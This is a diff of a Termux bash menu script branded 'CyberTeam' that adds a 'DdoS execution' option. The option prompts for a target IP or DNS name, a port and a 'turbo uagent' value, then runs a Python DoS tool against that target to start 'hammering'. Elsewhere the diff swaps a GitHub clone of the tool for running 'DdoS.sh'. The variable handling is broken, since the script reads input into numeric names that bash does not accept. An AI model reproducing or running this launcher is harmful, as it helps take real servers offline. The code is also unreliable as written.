@@ -1,12 +1,12 @@
 #contoh
 bi='\033[34;1m' #biru
 i='\033[32;1m' #ijo
-pur='\033[35;1m' #purple
-cy='\033[36;1m' #cyan
-me='\033[31;1m' #merah
-pu='\033[37;1m' #putih
-ku='\033[33;1m' #kuning
-mer='\033[41;97m' #Tepi
+pur='\033[35;1m'
+cy='\033[36;1m'
+me='\033[31;1m'
+pu='\033[37;1m'
+ku='\033[33;1m' 
+mer='\033[41;97m'
 R='\x1b[1;31m'
 G='\x1b[1;32m'
 B='\x1b[1;34m'
@@ -18,7 +18,7 @@ enda='\033[0m'
 
 clear
 echo "waiting......"
-sleep 10
+sleep 4
 clear
 echo
 echo
@@ -36,7 +36,8 @@ echo "    CyberTeam                                 :"
 echo "                                              :"
 echo ":::::::::::::::::::::::::::::::::::::::::::::::"
 echo $cy"1.install tools
-2.exit
+2.DdoS execution
+3.exit
          
          
          if you want to using DdoS first u must install tools
@@ -51,17 +52,35 @@ if [ $no = '1' ]
 then
 echo
 clear
-#!bin/Bash
-pkg install python git -y
-git clone https://github.com/mr-arx/DdoS
-chmod a+rx /data/data/com.termux/files/usr/bin/python DdoS.py
+pkg install python
 sleep 7
 clear
 echo"waiting....."
-exit
+sleep 2
+sh DdoS.sh
 fi
 
 if [ $no = '2' ]
+then
+read -p "IP Server/DNS LOOKUP:" 3782
+read -p "The Port recomen(80):" 177
+read -p "the turbo uagent recomen(135):" 293
+echo "waiting..."
+sleep 4
+echo "checking IP ($3782)"
+sleep 4
+echo "checking Port ($177)"
+sleep 4
+echo "checking Turbo Uagent ($293)"
+sleep 4
+echo "waiting..."
+sleep 3
+echo "try to starting hammering..."
+sleep 5
+python DdoS.py -s $3782 -p $177 -t $293
+fi
+
+if [ $no = '3' ]
 then
 echo do you want to exit y/n?
 read -p "select:" lmao
